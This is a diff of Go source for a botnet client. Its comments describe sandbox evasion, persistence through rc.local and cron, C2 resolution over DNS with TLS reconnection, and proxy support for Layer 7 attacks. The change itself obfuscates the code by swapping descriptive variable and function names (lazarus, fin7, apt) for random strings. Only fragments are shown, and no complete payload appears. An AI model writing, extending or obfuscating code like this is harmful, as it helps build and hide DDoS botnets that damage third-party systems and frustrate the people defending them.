@@ -82,13 +82,13 @@ func deoxys(format string, args ...interface{}) {
 }
 
 var (
-	lazarusActive  bool
-	lazarusMutex   sync.Mutex
-	lazarusCount   int32
-	lazarusStopCh  chan struct{}
-	aptStopChan      = make(chan struct{})
-	aptStopMutex     sync.Mutex
-	aptAttackRunning bool
+	gDnVkWb  bool
+	yHcRqTp   sync.Mutex
+	nBxFmZj   int32
+	kQvSdNw  chan struct{}
+	xKvNhBm      = make(chan struct{})
+	wQtJdRc     sync.Mutex
+	mPzLsXf bool
 
 
 	// Proxy support for L7 attacks (pre-validated by CNC)
@@ -269,7 +269,7 @@ func machete(cmd string, conn net.Conn) error {
 // main is the bot's entry point that orchestrates startup and C2 connection.
 // Startup sequence:
 //  1. Check for sandbox/analysis environment (winnti)
-//  2. Setup basic persistence (fin7)
+//  2. Setup basic persistence
 //  3. Resolve C2 address via multi-method DNS (dialga)
 //  4. Enter reconnection loop with TLS connections
 //
@@ -294,12 +294,12 @@ func main() {
 	}
 	deoxys("main: No sandbox detected, continuing")
 	revilSingleInstance()
-	deoxys("main: Running persistence check (fin7 -> rc.local)...")
-	fin7()
-	deoxys("main: fin7 persistence check complete")
-	deoxys("main: Running persistence check (lazarus -> cron)...")
-	lazarus()
-	deoxys("main: lazarus persistence check complete")
+	deoxys("main: Running persistence check (rc.local)...")
+	hRpCwZt()
+	deoxys("main: rc.local persistence check complete")
+	deoxys("main: Running persistence check (cron)...")
+	bNkXqVm()
+	deoxys("main: cron persistence check complete")
 	// Pre-compute bot metadata BEFORE connecting so REGISTER is instant.
 	cachedBotID = mustangPanda()
 	cachedArch = charmingKitten()
